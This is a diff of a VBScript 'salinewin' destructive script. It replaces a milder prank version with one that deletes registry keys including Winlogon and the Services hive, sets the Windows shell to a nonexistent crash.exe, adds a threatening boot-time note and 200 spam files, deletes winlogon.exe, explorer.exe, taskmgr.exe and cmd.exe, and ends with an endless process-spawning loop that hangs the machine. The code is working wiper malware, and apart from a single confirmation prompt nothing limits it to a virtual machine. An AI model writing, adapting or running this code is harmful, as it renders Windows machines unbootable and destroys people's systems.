@@ -1,48 +1,53 @@
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' =============== WARNING MESSAGE ====================
-answer = MsgBox("WARNING: This script will corrupt the registry and make Windows unbootable. Are you sure you want to continue?", 36, "!!! DANGER !!!")
+' === Final Warning ===
+answer = MsgBox("THIS WILL DESTROY YOUR VM AND SHOW A MESSAGE ON BOOT. CONTINUE?", 36, "!!! WARNING !!!")
+If answer <> 6 Then WScript.Quit
 
-If answer <> 6 Then
-    MsgBox "Operation cancelled.", 64, "Salinewin"
-    WScript.Quit
-End If
-
-' =============== PRANK PHASE ====================
-For i = 1 To 10
-    shell.Popup "SALINEWIN.EXE ERROR 0x" & Hex(Int(Rnd * 999999)), 1, "salinewin.exe", 48
-    shell.Run "notepad"
-    shell.SendKeys "SALINEWIN ERROR {ENTER}"
-    WScript.Sleep 100
-Next
-
-' Flash screen chaos
-For i = 1 To 3
-    shell.SendKeys "^+{ESC}"
-    shell.SendKeys "%{TAB}"
-    shell.SendKeys "{ESC}"
-    WScript.Sleep 200
-Next
-
-' =============== REGISTRY CORRUPTION ====================
+' === Registry Nuking ===
 keys = Array( _
     "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer", _
     "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
     "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", _
     "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", _
-    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl" _
+    "HKLM\SYSTEM\CurrentControlSet\Services" _
 )
-
 For Each key In keys
     On Error Resume Next
     shell.RegDelete key & "\"
 Next
 
-' Break Windows shell
+' Break Windows shell (no explorer.exe on boot)
 shell.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "crash.exe", "REG_SZ"
 
-' =============== FINAL MESSAGE & RESTART ====================
-WScript.Sleep 2000
-shell.Popup "Critical system failure. Restarting...", 3, "salinewin.exe", 16
-shell.Run "shutdown -r -t 5 -c ""System failure caused by salinewin.exe"""
+' === Drop persistent message file ===
+Set msgFile = fso.CreateTextFile("C:\salinewin_note.txt", True)
+msgFile.WriteLine "salinewin.exe has claimed this machine."
+msgFile.WriteLine "This system is no longer yours."
+msgFile.WriteLine "There is no escape."
+msgFile.Close
+
+' Make it open on boot
+shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\salinewin_note", "notepad.exe C:\salinewin_note.txt", "REG_SZ"
+
+' === Optional File Spam ===
+For i = 1 To 200
+    On Error Resume Next
+    Set spam = fso.CreateTextFile("C:\salinewinisgoat_" & i & ".txt", True)
+    spam.WriteLine "YOU WILL NO LONGER HAVE ACCESS TO THIS PC, IT WILL NO LONGER BOOT UP AGAIN"
+    spam.Close
+Next
+
+' === Destroy essential EXEs ===
+Set win = shell.ExpandEnvironmentStrings("%windir%")
+On Error Resume Next
+fso.DeleteFile(win & "\System32\winlogon.exe")
+fso.DeleteFile(win & "\System32\explorer.exe")
+fso.DeleteFile(win & "\System32\taskmgr.exe")
+fso.DeleteFile(win & "\System32\cmd.exe")
+
+' === RAM spam to hang system ===
+Do
+    shell.Run "notepad"
+Loop
